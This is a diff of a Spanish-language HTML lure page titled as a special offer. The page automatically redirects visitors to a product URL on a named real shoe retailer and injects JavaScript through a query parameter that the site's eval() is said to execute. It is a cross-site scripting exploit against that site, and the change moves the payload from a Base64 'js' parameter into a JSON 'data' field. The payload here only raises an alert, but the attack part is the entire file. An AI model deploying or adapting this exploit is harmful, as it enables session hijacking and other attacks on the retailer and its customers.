@@ -1,20 +1,17 @@
 <!DOCTYPE html>
 <html>
-<head><title>Oferta Exclusiva Adidas</title></head>
+<head><title>Oferta Especial</title></head>
 <body>
     <script>
-        // Este es el comando que queremos ejecutar en MasZapatillas
-        const payload = "alert('XSS AUTOMÁTICO: Sesión Comprometida'); document.body.style.background='red';";
+        // Payload: Creamos un elemento script y lo añadimos al cuerpo
+        // para que no dependa de la respuesta del servidor.
+        const payload = "alert('Vulnerabilidad Confirmada: XSS sin interaccion'); document.body.style.background='red';";
         
-        // Convertimos el comando a Base64 para que no se rompa la URL
-        const encodedPayload = btoa(payload);
+        // El truco: Inyectamos el payload como un parámetro que 'eval' pueda pescar
+        // Probamos con la URL del producto pero forzando que el script de la web se active
+        const urlFinal = "https://maszapatillas.com/es/zapatillas-mujer/47194-143055-zapatillas-adidas-spezial-.html?action=shopperPrices&data=[{\"id\":\"1\",\"js\":\"" + payload + "\"}]";
 
-        // Intentamos forzar a la web a que lea nuestro JS desde la URL
-        // Usamos el parámetro 'js' que es el que busca su función eval()
-        const targetURL = "https://maszapatillas.com/es/zapatillas-mujer/47194-143055-zapatillas-adidas-spezial-.html?action=shopperPrices&js=" + encodedPayload;
-
-        // Redirección automática
-        window.location.href = targetURL;
+        window.location.href = urlFinal;
     </script>
 </body>
 </html>
